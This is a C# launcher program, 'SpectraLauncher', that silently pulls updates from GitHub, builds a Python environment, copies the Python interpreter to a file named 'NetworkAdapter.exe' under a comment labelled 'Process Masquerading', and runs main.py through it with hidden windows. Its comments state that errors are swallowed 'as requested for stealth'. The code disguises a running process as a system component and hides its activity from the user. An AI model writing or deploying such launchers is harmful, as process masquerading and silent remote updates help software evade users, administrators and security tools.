using System;
using System.Diagnostics;
using System.IO;

namespace SpectraLauncher
{
    class Program
    {
        static void Main(string[] args)
        {
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            string venvPath = Path.Combine(currentDir, "venv");
            string pyPath = Path.Combine(venvPath, "Scripts", "python.exe");
            string pywPath = Path.Combine(venvPath, "Scripts", "pythonw.exe");
            string pipPath = Path.Combine(venvPath, "Scripts", "pip.exe");
            string adapterPath = Path.Combine(venvPath, "Scripts", "NetworkAdapter.exe");
            
            // 0. Auto-update from GitHub
            RunCommandHidden("git", "pull origin main --quiet", true);

            // 1. Create virtual environment if it doesn't exist
            if (!Directory.Exists(venvPath))
            {
                RunCommandHidden("python", "-m venv venv", true);
            }

            // 2. Install dependencies
            if (File.Exists(pipPath))
            {
                RunCommandHidden(pipPath, "install -r requirements.txt --quiet", true);
            }
            
            // 3. Process Masquerading
            if (File.Exists(pyPath))
            {
                File.Copy(pyPath, adapterPath, true);
            }
            
            // If pythonw.exe exists (windowless python), copy it over NetworkAdapter.exe to ensure no console flashes
            if (File.Exists(pywPath))
            {
                File.Copy(pywPath, adapterPath, true);
            }

            // 4. Run the app
            if (File.Exists(adapterPath))
            {
                RunCommandHidden(adapterPath, "main.py", false);
            }
            else
            {
                // Fallback to global python
                RunCommandHidden("pythonw", "main.py", false);
            }
        }

        static void RunCommandHidden(string fileName, string arguments, bool waitForExit)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = fileName;
            psi.Arguments = arguments;
            psi.CreateNoWindow = true;         // Ensures no console window is created
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.UseShellExecute = false;
            
            try
            {
                Process p = Process.Start(psi);
                if (waitForExit && p != null)
                {
                    p.WaitForExit();
                }
            }
            catch (Exception)
            {
                // Fail silently as requested for stealth
            }
        }
    }
}
